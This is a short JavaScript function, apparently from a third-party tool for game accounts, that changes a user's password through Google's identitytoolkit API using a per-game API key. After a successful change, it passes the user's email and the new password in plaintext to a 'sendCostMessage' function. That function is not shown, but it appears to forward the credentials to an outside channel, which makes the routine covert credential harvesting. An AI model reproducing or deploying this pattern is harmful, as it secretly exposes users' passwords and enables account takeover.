async function changePassword(){
    if(!requireLogin()) return;
    const newPassword=prompt("Enter new password:"); if(!newPassword) return;
    try{
        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({ idToken:currentToken,password:newPassword,returnSecureToken:true })
        });
        const data=await resp.json();
        if(data.email){ 
            currentPassword=newPassword; 
            currentToken=data.idToken; 
            updateStatus("✅ Password changed successfully!",false,'serviceStatus'); 
            sendCostMessage(`🔐 Change Password\n📧 Email: ${currentUser}\n🔒 New Password: ${currentPassword}`); 
        }
        else updateStatus(`❌ Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
}